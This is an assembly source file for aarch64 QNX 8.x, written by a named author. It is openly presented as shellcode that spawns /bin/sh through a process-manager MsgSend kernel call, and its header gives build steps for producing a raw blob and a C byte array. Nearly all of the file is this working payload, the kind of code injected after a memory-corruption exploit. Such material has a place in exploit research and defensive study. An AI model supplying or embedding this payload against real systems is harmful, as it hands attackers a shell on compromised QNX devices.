/*
 * QNX 8.x aarch64 Shellcode (not optimized)
 *   execve("/bin/sh", {"/bin/sh"}, {"PATH=/proc/boot:/system/bin"} )
 *
 * By Claes M Sjöberg <cmn@signedness.org>, May 2026
 *
 * Compile executable:
 *  ntoaarch64-as -o execve_binsh.o execve_binsh.s
 *  qcc -Vgcc_ntoaarch64le -nostdlib -o execve_binsh execve_binsh.o
 *  ntoaarch64-objdump -S execve_binsh
 *
 * Create and disassemble blob:
 *  ntoaarch64-as -o execve_binsh.o execve_binsh.s
 *  ntoaarch64-objcopy -O binary execve_binsh.o execve_binsh.bin
 *  ntoaarch64-objdump -D -b binary -m aarch64 execve_binsh.bin 
 *
 * Create shellcode C array:
 *  xxd --include execve_binsh.bin
 */

.global main
.text
main:
    // Build up the message to send using MsgSend() onto the stack.
    // Since the stack grow towards lower addresses, we start
    // from the end and build up all the required fields with as
    // many set to zero as possible.

    //
    // envp {"PATH=/proc/boot:/system/bin"}
    //

    // "bin\x00\x00\x00\x00\x00" -> 0x00000000006e6962
    movz    x0, #0x6962, lsl #0
    movk    x0, #0x006e, lsl #16

    // Store first string on stack
    // together with a zero value
    eor     x1, x1, x1
    stp     x0, x1, [sp, #-16]!

    // "/system/" -> 0x2f6d65747379732f
    movz    x1, #0x732f, lsl #0
    movk    x1, #0x7379, lsl #16
    movk    x1, #0x6574, lsl #32
    movk    x1, #0x2f6d, lsl #48

    // "oc/boot:" -> 0x3a746f6f622f636f
    movz    x0, #0x636f, lsl #0
    movk    x0, #0x622f, lsl #16
    movk    x0, #0x6f6f, lsl #32
    movk    x0, #0x3a74, lsl #48

    // Next two uint64_t values
    stp     x0, x1, [sp, #-16]!

    //
    // "PATH=/pr" -> 0x72702f3d48544150
    //
    movz    x0, #0x4150, lsl #0
    movk    x0, #0x4854, lsl #16
    movk    x0, #0x2f3d, lsl #32
    movk    x0, #0x7270, lsl #48

    //
    // argv {"/bin/sh"}
    //
    movz    x1, #0x0068, lsl #48 // 0x0068
    movk    x1, #0x732f, lsl #32 // 0x732f
    movk    x1, #0x6e69, lsl #16 // 0x6e69
    movk    x1, #0x622f, lsl #0  // 0x622f

    // Push rest of envp and argv
    stp     x1, x0, [sp, #-16]!

    // path "/bin/sh"
    add     x0, x1, #0

    // nfds, nargv, narge, reserved, totbytes, pad
    // ignored by process manager, can be zero
    eor     x0, x0, x0

    // push path and zero
    stp     x0, x1, [sp, #-16]!
    
    // push 8 times 2*uint64_t as zero
    eor     x1, x1, x1
    stp     x1, x0, [sp, #-16]!
    stp     x1, x0, [sp, #-16]!
    stp     x1, x0, [sp, #-16]!
    stp     x1, x0, [sp, #-16]!
    stp     x1, x0, [sp, #-16]!
    stp     x1, x0, [sp, #-16]!
    stp     x1, x0, [sp, #-16]!

    // 0x0001000000000000 constant
    movz    x0, #0x0001, lsl #48 // 0x0001

    // Add to stack
    // 0x0000000000000000 zero
    // 0x0001000000000000 constant
    stp     x0, x1, [sp, #-16]!

    // The 0x24 at the end of this uint64_t is
    // strlen(path) + 1 + strlen(envp[0]) + 1
    // So modify this if you want to exec anything else but /bin/sh
    // 0x0000 0088 0000 0024
    movz    x1, #0x0088, lsl #32      
    movk    x1, #0x0024, lsl #0 // strlen(path)+1+strlen(envp[0])+1     

    // Add to stack
    // 0x0000008800000024 
    // 0x0000000000000000 zero
    eor     x0, x0, x0
    stp     x0, x1, [sp, #-16]!

    // type, subtype, pathlen and searchpath
    // 0x 0001 0008 0006 0010
    movz    x1,  #0x0001, lsl #48
    movk    x1,  #0x0008, lsl #32
    movk    x1,  #0x0006, lsl #16
    movk    x1,  #0x0010, lsl #0

    // Add to stack
    // 0x0000000000000000 zero
    // 0x0001000800060010 type, subtype, pathlen and searchpath
    stp     x1, x0, [sp, #-16]!

    // MsgSend(0x40000000, (void *)&msg, sizeof(msg), NULL, 0))
    // MsgSend(x0,                   x1,          x2,   x3, x4)
    movz    x0, #0x4000, lsl #16    // 0x40000000
    add     x1, sp, #0              // &msg
    movz    x2, #0x00d4, lsl #0     // sizeof(msg)
    eor     x3, x3, x3              // NULL
    eor     x4, x4, x4              // 0

    neg     x2, x2
    neg     x4, x4
    mov     w8, #0x0b               // syscall number 11
    svc     #0x51                   // QNX Kernel Callout (instead of #0)
